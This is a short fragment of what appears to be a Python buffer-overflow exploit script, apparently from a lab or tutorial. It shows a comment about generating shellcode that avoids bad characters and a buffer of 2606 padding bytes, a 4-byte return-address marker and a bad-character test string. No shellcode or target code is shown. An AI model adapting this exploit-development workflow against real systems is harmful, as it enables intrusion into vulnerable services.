...
### NEXT steps ### now that we know bad char's, we need to create shellcode without them!!!
...
# Create a unique string to send that will allow us to track overflow.
buffer = "A"*2606 + "B"*4 + charTest
data = ""
